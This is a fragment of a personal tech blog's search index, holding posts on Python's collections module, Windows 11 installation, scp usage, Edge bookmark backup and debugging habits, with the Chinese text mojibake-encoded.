&#x27;o&#x27;: 1&#125;)</span><br></pre></td></tr></table></figure><p>Counter å®é™…ä¸Šæ˜¯ä½¿ç”¨ for å¾ªç¯å’Œå­—å…¸è¿›è¡Œè®¡æ•°çš„å°è£…ç‰ˆï¼Œè¿”å›å­—å…¸ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [36]: a = Counter(word)</span><br><span class="line">In [37]: word = &quot;mississippi&quot;</span><br><span class="line">In [38]: a = Counter(word)</span><br><span class="line">In [39]: a.keys(), a.values(), a.items()</span><br><span class="line">Out[39]:</span><br><span class="line">(dict_keys([&#x27;m&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;p&#x27;]),</span><br><span class="line"> dict_values([1, 4, 4, 2]),</span><br><span class="line"> dict_items([(&#x27;m&#x27;, 1), (&#x27;i&#x27;, 4), (&#x27;s&#x27;, 4), (&#x27;p&#x27;, 2)]))</span><br><span class="line"></span><br><span class="line">In [40]: counter = &#123;&#125;</span><br><span class="line">In [41]: for letter in word:</span><br><span class="line">    ...:     if letter not in counter:</span><br><span class="line">    ...:         counter[letter] = 0</span><br><span class="line">    ...:     counter[letter] += 1</span><br><span class="line">    ...:</span><br><span class="line">In [45]: counter</span><br><span class="line">Out[45]: &#123;&#x27;m&#x27;: 1, &#x27;i&#x27;: 4, &#x27;s&#x27;: 4, &#x27;p&#x27;: 2&#125;</span><br></pre></td></tr></table></figure><h2 id="handling-missing-keys-defaultdict">Handling Missing Keys:defaultdict</h2><p>python å­—å…¸ç›´æ¥è®¿é—®ä¸å­˜åœ¨çš„ key ä¼šä¿å­˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ dict è‡ªå¸¦çš„å‡½æ•°get() æ¥è®¿é—®ï¼Œä¸å­˜åœ¨çš„ key ä¼šè¿”å› None</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">62</span>]: a = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Jone&quot;</span>, <span class="string">&quot;job&quot;</span>: <span class="string">&quot;developer&quot;</span>&#125;</span><br><span class="line">In [<span class="number">63</span>]: a.get(<span class="string">&quot;height&quot;</span>)</span><br><span class="line">In [<span class="number">64</span>]: a[<span class="string">&quot;height&quot;</span>]</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">KeyError                                  Traceback (most recent call last)</span><br><span class="line">Cell In[<span class="number">64</span>], line <span class="number">1</span></span><br><span class="line">----&gt; <span class="number">1</span> a[<span class="string">&quot;height&quot;</span>]</span><br><span class="line">KeyError: <span class="string">&#x27;height&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">65</span>]: a.get(<span class="string">&quot;height&quot;</span>) == <span class="literal">None</span></span><br><span class="line">Out[<span class="number">65</span>]: <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><code>class collections.defaultdict(default_factory=None[,&#123;key1:value1,..&#125;])</code></p><p><code>defaultdict</code> ç›¸å¯¹äº dict å¢åŠ çš„ä¸¤ä¸ªåŠŸèƒ½: 1. è®¿é—®ä¸å­˜åœ¨çš„key ä¸æŠ¥é”™ 2. ä¸å­˜åœ¨çš„ key çš„ï¼Œè¿”å›é¢„å…ˆå®šä¹‰çš„é»˜è®¤å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">82</span>]: b = [(<span class="string">&quot;red&quot;</span>, <span class="number">2</span>), (<span class="string">&quot;blue&quot;</span>, <span class="number">4</span>), (<span class="string">&#x27;yellow&#x27;</span>, <span class="number">8</span>), (<span class="string">&#x27;red&#x27;</span>,<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">In [<span class="number">83</span>]: <span class="keyword">for</span> name, num <span class="keyword">in</span> b:</span><br><span class="line">    ...:     color[name].append(num)</span><br><span class="line"></span><br><span class="line">In [<span class="number">84</span>]: color</span><br><span class="line">Out[<span class="number">84</span>]: defaultdict(<span class="built_in">list</span>, &#123;<span class="string">&#x27;red&#x27;</span>: [<span class="number">2</span>, <span class="number">5</span>], <span class="string">&#x27;blue&#x27;</span>: [<span class="number">4</span>], <span class="string">&#x27;yellow&#x27;</span>: [<span class="number">8</span>]&#125;)</span><br></pre></td></tr></table></figure><h2 id="keeping-your-dictionaries-ordered-ordereddict">Keeping YourDictionaries Ordered: OrderedDict</h2><p><code>OrderedDict</code>ï¼š</p><ol type="1"><li>å…·å¤‡æ¯ä¸ª key-value pairçš„æ’å…¥é¡ºåºï¼Œå¯ä»¥åœ¨æ³¨é‡é¡ºåºçš„æƒ…å†µä¸‹å‘æŒ¥ä½œç”¨</li><li>æä¾›äº† <code>.move_to_end()</code>, <code>popitem()</code>æ–¹æ³•æ¥æ“ä½œ pair çš„é¡ºåºã€‚æ¬¡å§</li><li>åœ¨æ¯”è¾ƒä¸¤ä¸ª orderdict æ—¶ï¼Œæ¯”è¾ƒå…ƒç´ ä¸é¡ºåºï¼ŒäºŒè€…éƒ½ç›¸åŒæ‰å¯ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">87</span>]: letters = OrderedDict(b=<span class="number">3</span>, c = <span class="number">4</span>, e=<span class="number">2</span>, a=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">88</span>]: letters</span><br><span class="line">Out[<span class="number">88</span>]: OrderedDict([(<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>)])</span><br><span class="line"></span><br><span class="line">In [<span class="number">89</span>]: letters.move_to_end(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">90</span>]: letters</span><br><span class="line">Out[<span class="number">90</span>]: OrderedDict([(<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>)])</span><br><span class="line"></span><br><span class="line">In [<span class="number">91</span>]: letters.move_to_end(<span class="string">&#x27;b&#x27;</span>, last=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">92</span>]: letters</span><br><span class="line">Out[<span class="number">92</span>]: OrderedDict([(<span class="string">&#x27;b&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">5</span>)])</span><br></pre></td></tr></table></figure><h2 id="chaining-dictionaries-together-chainmap">Chaining DictionariesTogether: ChainMap</h2><p>ChainMap å¯ä»¥å®¹çº³å¤šä¸ª mapping/dictionaries,å¹¶æ¯”åˆ›å»ºä¸€ä¸ªå­—å…¸ï¼Œç„¶åå†å¤šæ¬¡ update() æ›´æ–°çš„é€Ÿåº¦å¿«.å®ƒæ˜¯ä¸€ä¸ªå¯å˜çš„è§†å›¾,updateable views. å¯¹å…¶è¿›è¡Œçš„ä¿®æ”¹éƒ½ä¼šå½±å“åˆ°å¯¹åº”çš„dictionaryã€‚</p><p><code>class collections.ChainMap(*maps)</code></p><p>åº”ç”¨åœºæ™¯ 1ï¼šå¤šä¸ªä¸Šä¸‹æ–‡ï¼Œå˜é‡ç­‰å…·æœ‰ access priority çš„æƒ…å†µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [93]: cmd_proxy = &#123;&#125;</span><br><span class="line">In [94]: local_proxy = &#123;&quot;proxy&quot;: &quot;proxy.local.com&quot;&#125;</span><br><span class="line">In [95]: global_proxy = &#123;&quot;proxy&quot;: &quot;proxy.global.com&quot;&#125;</span><br><span class="line">In [100]: config = ChainMap(cmd_proxy, local_proxy, global_proxy)</span><br><span class="line">In [101]: config[&#x27;proxy&#x27;]</span><br><span class="line">Out[101]: &#x27;proxy.local.com&#x27;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç³»åˆ—çš„å‡½æ•°ï¼Œå¦‚ <code>.map</code>è¿”å›å†…éƒ¨æ‰€æœ‰çš„å­—å…¸çš„åˆ—è¡¨ã€‚æ­¤å¤–è¿˜å¯ä»¥å¯¹å…¶è¿›è¡Œ dict çš„æ“ä½œï¼Œåªæ˜¯è¿™äº›é’ˆå¯¹dict çš„æ“ä½œï¼Œéƒ½åªé’ˆå¯¹ç¬¬ä¸€ä¸ª dictionaryï¼Œä¾‹å¦‚ <code>.pop()</code>,<code>clear()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [105]: config.maps</span><br><span class="line">Out[105]: [&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [106]: config</span><br><span class="line">Out[106]: ChainMap(&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">In [107]: config.maps</span><br><span class="line">Out[107]: [&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [108]: config[&#x27;proxy&#x27;] = &quot;proxy.cmd.com&quot;</span><br><span class="line"></span><br><span class="line">In [109]: config.maps</span><br><span class="line">Out[109]:</span><br><span class="line">[&#123;&#x27;proxy&#x27;: &#x27;proxy.cmd.com&#x27;&#125;,</span><br><span class="line"> &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;,</span><br><span class="line"> &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;]</span><br><span class="line"></span><br><span class="line">In [111]: config.pop(&#x27;proxy&#x27;)</span><br><span class="line">Out[111]: &#x27;proxy.cmd.com&#x27;</span><br><span class="line"></span><br><span class="line">In [112]: config</span><br><span class="line">Out[112]: ChainMap(&#123;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.local.com&#x27;&#125;, &#123;&#x27;proxy&#x27;: &#x27;proxy.global.com&#x27;&#125;)</span><br></pre></td></tr></table></figure><h2 id="deque"><code>deque</code></h2><p>deque: <strong>d</strong>ouble <strong>e</strong>nded<strong>que</strong>ue,æä¾›åŒç«¯é˜Ÿåˆ—</p><p>ä¸»è¦æœ‰ append, pop, popleft, extend, extendleft ç­‰æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In [113]: d = deque()</span><br><span class="line"></span><br><span class="line">In [114]: d.append(1)</span><br><span class="line"></span><br><span class="line">In [115]: d.append(2)</span><br><span class="line"></span><br><span class="line">In [116]: d.append(3)</span><br><span class="line"></span><br><span class="line">In [117]: d</span><br><span class="line">Out[117]: deque([1, 2, 3])</span><br><span class="line"></span><br><span class="line">In [118]: d[0]</span><br><span class="line">Out[118]: 1</span><br><span class="line"></span><br><span class="line">In [119]:</span><br><span class="line"></span><br><span class="line">In [119]: d.pop()</span><br><span class="line">Out[119]: 3</span><br><span class="line"></span><br><span class="line">In [120]: d.popleft()</span><br><span class="line">Out[120]: 1</span><br><span class="line"></span><br><span class="line">In [121]: d.extend([4,5,6])</span><br><span class="line"></span><br><span class="line">In [122]: d</span><br><span class="line">Out[122]: deque([2, 4, 5, 6])</span><br><span class="line"></span><br><span class="line">In [123]: d.extendleft([7,8,9])</span><br><span class="line"></span><br><span class="line">In [124]: d</span><br><span class="line">Out[124]: deque([9, 8, 7, 2, 4, 5, 6])</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://realpython.com/python-collections-module/#chaining-dictionaries-together-chainmap">Python'scollections: A Buffet of Specialized Data Types â€“ Real Python</a></li><li><ahref="https://docs.python.org/3/library/collections.html#defaultdict-objects">collectionsâ€” Container datatypes â€” Python 3.11.4 documentation</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 å°é²œ</title>
      <link href="/blog/2022/07/02/misc/win11/"/>
      <url>/blog/2022/07/02/misc/win11/</url>
      
        <content type="html"><![CDATA[<p>ä¸€å¼€å§‹å¸Œæœ›ç›´æ¥åŸç³»ç»Ÿå‡çº§ï¼Œå°±ä¸ç”¨å¤‡ä»½æ•°æ®äº†ï¼Œä½†æ˜¯å¥½åƒåŸ Win10ç³»ç»Ÿæœ¬æ¥å°±æ›´æ–°ä¸é¡ºç•…æœ‰é—®é¢˜ï¼ŒæŠ˜è…¾äº†ä¸€å¤©å¤šï¼Œä¹Ÿæ²¡ææˆã€‚åæ¥å¹²è„†ï¼Œç›´æ¥é‡è£…ï¼Œä¸–ä¸Šæ— éš¾äº‹ï¼Œåªæ€•æœ‰å¿ƒäººã€‚ç›¸å…³å·¥å…·åŠé“¾æ¥ï¼š</p><p>é€šè¿‡è¯¥å·¥å…·ä¿®æ”¹ Win11 çš„ ISO å®ç°è®©è¿‡ TPM ä½¿æˆ‘çš„æ—§æœºå­ä¹Ÿèƒ½è£…ä¸Šï¼š</p><p><ahref="https://github.com/AveYo/MediaCreationTool.bat">AveYo/MediaCreationTool.bat:Universal MCT wrapper script for all Windows 10/11 versions from 1507 to21H2!</a></p><p>é‡è£… Win11 ä¹‹åï¼Œæ›´æ–°è¿˜æ˜¯æ£€æµ‹ä½ æœºå­ä¸æ»¡è¶³è¦æ±‚ï¼Œå¯ç›´æ¥ç”¨ä¸‹é¢è½¯ä»¶å¼€å§‹Dev channel é¢„è§ˆç‰ˆæ›´æ–°ã€‚ <ahref="https://github.com/abbodi1406/offlineinsiderenroll">abbodi1406/offlineinsiderenroll:OfflineInsiderEnroll - A script to enable access to the Windows InsiderProgram on machines not signed in with Microsoft Account</a></p><p>é¼ æ ‡ï¼Œæ˜¾å¡ä¹‹ç±»çš„é©±åŠ¨ï¼Œå¦‚æœæœ‰ä¸æ­£å¸¸çš„ï¼Œæ‰¾åˆ°äº†æˆ‘æœºå­çš„å®˜ç½‘ä¸‹è½½: <ahref="https://support.hp.com/cn-zh/drivers/selfservice/hp-pavilion-power-15-cb000-laptop-pc/15551388">HPPavilion Power 15-cb000 ç¬”è®°æœ¬ç”µè„‘ è½¯ä»¶å’Œé©±åŠ¨ä¸‹è½½ | æƒ æ™® Â®å®¢æˆ·æ”¯æŒ</a></p><p>æ®è¯´ rufus ä¹Ÿæ”¯æŒç›´æ¥å†™ Win11 no tpm äº†ï¼Œè¿˜å¯ä»¥åˆ¶ä½œ Win togoï¼ŒçœŸæ˜¯è£…æœºå°èƒ½æ‰‹ã€‚ <a href="https://rufus.ie/en/">Rufus - Createbootable USB drives the easy way</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows åŒç½‘å¡é…ç½®</title>
      <link href="/blog/2022/07/02/misc/double_nic/"/>
      <url>/blog/2022/07/02/misc/double_nic/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ <ahref="https://www.wuduoqiang.com/archives/%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AE%9A%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE">è½¯ä»¶ä½¿ç”¨æŒ‡å®šç½‘å¡é…ç½®</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scp å‘½ä»¤</title>
      <link href="/blog/2022/07/02/linux/tools/ssh_scp/"/>
      <url>/blog/2022/07/02/linux/tools/ssh_scp/</url>
      
        <content type="html"><![CDATA[<h2id="recommend-vscode-è¿æ¥è¿œç¨‹-ssh-ä¹‹åç›´æ¥æœ¬åœ°æ–‡ä»¶æ‹–æ‹½è‡³-vscode-ç›®å½•å³å¯ä¸Šä¼ å³é”®è¿œç¨‹æ–‡ä»¶å³å¯ä¸‹è½½">[Recommend]vscode è¿æ¥è¿œç¨‹ ssh ä¹‹åï¼Œç›´æ¥æœ¬åœ°æ–‡ä»¶æ‹–æ‹½è‡³ vscodeç›®å½•å³å¯ä¸Šä¼ ï¼Œå³é”®è¿œç¨‹æ–‡ä»¶å³å¯ä¸‹è½½</h2><h2 id="scp-å‘½ä»¤">SCP å‘½ä»¤</h2><p><code>scp [-P port_num] [-r] æºæ–‡ä»¶ ç›®çš„åœ°</code></p><p>æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼ˆå¦‚æœä¸ºç›®å½•, éœ€è¦åœ¨ <code>scp</code> ååŠ <code>-r</code>ï¼‰:<code>scp username@server_ip:/path/filename /tmp/local_destination</code></p><p>å¦‚éœ€æŒ‡å®š ssh ç«¯å£ï¼Œåœ¨ scp åè·Ÿ<code>-P</code>é€‰é¡¹ï¼Œ<code>scp -P123 commands</code></p><p>ä¾‹å­ï¼š</p><ol type="1"><li><p>æœ¬åœ°ä¸Šä¼ <strong>æ–‡ä»¶</strong>åˆ° <strong>22ç«¯å£</strong>æœåŠ¡å™¨:<code>scp /path/local_filename username@server_ip:/path</code></p></li><li><p>æœ¬åœ°ä¸Šä¼ <strong>æ–‡ä»¶å¤¹</strong>åˆ° <strong>2341ç«¯å£</strong>æœåŠ¡å™¨ï¼š<code>scp -P 2341 -r /path/local_dir username@server_ip:/path</code></p></li></ol><p>å¸¸è§æŠ¥é”™ï¼š</p><ol type="1"><li><p>å¦‚æœå‡ºç°æœåŠ¡å™¨æ‹’ç»ï¼Œå¯èƒ½æ˜¯æœåŠ¡å™¨çš„æ–‡ä»¶æƒé™é—®é¢˜;å¦‚æœå‡ºç°æœ¬åœ°æ‹’ç»ï¼Œå¯èƒ½æ˜¯æœ¬åœ°ç”¨æˆ·ä»¥åŠæ–‡ä»¶æƒé™é—®é¢˜ã€‚</p></li><li><p>å¦‚æœå‡ºç° <code>not a regular file</code>ï¼ŒæºæœåŠ¡å™¨ä¸Šä¸å­˜åœ¨è¯¥æ–‡ä»¶æˆ–è€…è¯¥æ–‡ä»¶ä¸æ˜¯æ­£å¸¸æ–‡ä»¶,å‡ºé”™åŸå› ï¼š</p><ol type="1"><li>æºä¸ç›®çš„æ•´åäº†</li><li>ç›®å½•æœªåŠ  <code>-r</code></li></ol></li></ol><p>æœåŠ¡å™¨ç›¸äº’æ‹·è´æ–‡ä»¶</p><ol type="1"><li>é¦–å…ˆå°†è‡ªå·±æœåŠ¡å™¨çš„ ssh å¼€å¯ï¼Œç¡®ä¿å½“å‰ç”¨æˆ·å¯ä»¥ä½¿ç”¨</li><li>ç„¶åï¼Œå°†å¤åˆ¶çš„ç›®çš„æ–‡ä»¶å¤¹åœ¨é»˜è®¤ç”¨æˆ·ä¸‹çš„æƒé™æé«˜</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Backup of Edge collections and Favorites</title>
      <link href="/blog/2022/07/02/misc/browser_backup/"/>
      <url>/blog/2022/07/02/misc/browser_backup/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘æ›´æ–° Windows 11 å°é²œï¼Œæ›´æ–°å‰ç‰¹åœ°å¯¹ Edge æµè§ˆå™¨è¿›è¡Œäº†åŒæ­¥ï¼Œç„¶è€ŒFavorite è¿˜æ˜¯ä¸¢äº†ï¼Œåƒåœ¾ Edge æµè§ˆå™¨ï¼ŒWindowsåŒæ­¥éƒ½åšä¸å¥½ï¼Œåˆ«è¯´è·¨å¹³å°äº†ï¼Œä¹Ÿå°± Windows ä¸Šç”¨ç”¨ã€‚ä½†æ˜¯åˆä¹ æƒ¯äº† Edgeçš„ä¾§è¾¹æ å’Œ collectionï¼Œæ‰€ä»¥æ³¨æ„æ—¶å¸¸å¤‡ä»½è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p>å¯¹äºå¯†ç ï¼Œæˆ‘ä½¿ç”¨ LastPass æ’ä»¶ï¼Œè·¨æµè§ˆå™¨ã€‚</p><p>Edge collections å¤‡ä»½ï¼š å…³é—­ Edgeæµè§ˆå™¨ï¼Œæ‰“å¼€ä¸‹é¢è·¯å¾„ï¼š<code>%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\Collections</code>ï¼Œå°†collectionsSQLite æ–‡ä»¶å¤‡ä»½</p><p>è¿˜åŸï¼šå°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°ä¸Šé¢å¯¹åº”ä½ç½®è¦†ç›–å³å¯ã€‚</p><p>Edge favorite å¤‡ä»½ï¼š å…³é—­ Edgeæµè§ˆå™¨ï¼Œæ‰“å¼€ä¸‹é¢è·¯å¾„ï¼š<code>"%userprofile%\AppData\Local\Microsoft\Edge\User Data\Default\"</code>ï¼Œæ‰¾åˆ°<code>Bookmarks</code> æ–‡ä»¶å¤‡ä»½å³å¯</p><p>è¿˜åŸï¼šå°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°ä¸Šé¢å¯¹åº”ä½ç½®è¦†ç›–å³å¯ã€‚</p><p>å¯¹äº MacOS å¯ä»¥åœ¨ edge æµè§ˆå™¨è¾“å…¥ <code>edge://version/</code>,æŸ¥çœ‹Profile path, ä¾¿å¯¹åº” Windows çš„ä½ç½®äº†.</p><h2 id="mac-ä¸Šä½ç½®">Mac ä¸Šä½ç½®</h2><p>æµè§ˆå™¨è¾“å…¥ï¼š<code>edge://version</code>ï¼Œ Finderè·³è½¬åˆ°æ˜¾ç¤ºçš„ä½ç½®å³å¯ã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://blog.darkthread.net/blog/edge-collections-backup/">Edgeé›†é”¦å¤‡ä»½ä¸æ¬ç§»-é»‘æš—æ‰§è¡Œç»ª</a> <ahref="https://stackoverflow.com/questions/72520979/where-is-the-location-of-microsoft-edge-extension-folder-that-are-installed-on-m">Whereis the location of Microsoft Edge Extension Folder that are installed onMacOS? - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¦‚ä½•å‡å°‘ä½çº§ Bugs</title>
      <link href="/blog/2022/07/02/misc/bugs/"/>
      <url>/blog/2022/07/02/misc/bugs/</url>
      
        <content type="html"><![CDATA[<ol start="0" type="1"><li><p>Think twice before you start typing</p></li><li><p>æœ€é‡è¦çš„åº”è¯¥æ˜¯é€šè¿‡å‰æœŸåšå¥½è®¾è®¡ï¼Œä¸­æœŸèµ°è¯»é€»è¾‘ï¼ŒåæœŸæµ‹è¯•åˆ†æï¼Œæ¥æé«˜ä»£ç è´¨é‡ï¼Œç¼©çŸ­å¼€å‘æ—¶é—´ã€‚</p></li><li><p>å­¦ä¼šç›®æ ‡çš„åˆ†è§£</p><p>æ¯æ¬¡ç¼–ç çš„æ—¶å€™å°†ç›®æ ‡èšé›†åœ¨ä¸€ä¸ªå°½å¯èƒ½å°çš„ç‚¹ä¸Š,æ¯”å¦‚å®ç°ä¸€ä¸ªå‡½æ•°,æŠŠæ¥å£å‡ºå£å‚æ•°ç­‰éƒ½è€ƒè™‘æ¸…æ¥š,ç²¾ç¥é›†ä¸­,è¦åšåˆ°ä¸€æ¬¡ç¼–è¯‘ä¸æ˜¯éš¾äº‹.å­¦ä¼šç›®æ ‡çš„åˆ†è§£,ä¸è¦ä¸€æ¬¡æ€§åšå¤ªå¤šçš„äº‹æƒ…,ä¸ä»…æ˜¯å¥½çš„ç¼–ç è§„èŒƒ,ä¹Ÿæ˜¯å¥½çš„ç¼–ç¨‹ä¹ æƒ¯.</p></li><li><p>å•å…ƒæµ‹è¯•</p><p>å†™å®Œä¸€ä¸ªå°çš„åŠŸèƒ½ç‚¹æµ‹è¯•ä¸€ä¸‹</p></li><li><p>å¯¹æ¯ä¸€ä¸ªå°é—®é¢˜è¿½æ ¹ç©¶åº•</p><p>åˆ†æé”™è¯¯, ä¸ºä»€ä¹ˆå‡ºç°, å¯¼è‡´ä»€ä¹ˆç°è±¡ï¼Œæ ¹å› æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆè§£å†³</p><p>â€œè¾¹ç•Œæ¡ä»¶å†™é”™â€ è¿™ä¸ªéœ€è¦è‡ªå·±æ€è€ƒã€‚ â€œè°ƒç”¨å˜é‡æ··æ·†â€è¿™ä¸ªéœ€è¦å¥½çš„<strong>ç¼–ç¨‹é£æ ¼</strong>ã€‚ â€œå°‘å†™åæ‹¬å·â€ éœ€è¦ IDEã€‚</p></li><li><p>ç¼–ç¨‹é£æ ¼</p></li><li><p>ä»£ç ç»“æ„ã€æ¨¡å—åŒ–</p></li><li><p>è¯­æ³•ç†Ÿç»ƒç¨‹åº¦</p></li></ol><h2 id="é«˜é˜¶è°ƒè¯•æŠ€å·§">é«˜é˜¶è°ƒè¯•æŠ€å·§</h2><ol type="1"><li><p>å¤šçº¿ç¨‹è°ƒè¯•</p></li><li><p>Drop Frame</p><p>åé€€æ‰§è¡Œ</p></li><li><p>æ¡ä»¶æ–­ç‚¹</p></li><li><p>æ‰§è¡Œä¸´æ—¶ä»£ç </p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://www.zhihu.com/question/27567688">èµ„æ·±ç¨‹åºå‘˜æœ‰å“ªäº›ç»éªŒå’ŒæŠ€å·§å¯ä»¥ä½¿è‡ªå·±å†™ä»£ç ä¸€éç¼–è¯‘é€šè¿‡ï¼Œå‡å°‘ä½çº§bugï¼Ÿ</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash ä½¿ç”¨ Tips</title>
      <link href="/blog/2022/07/02/misc/clash/"/>
      <url>/blog/2022/07/02/misc/clash/</url>
      
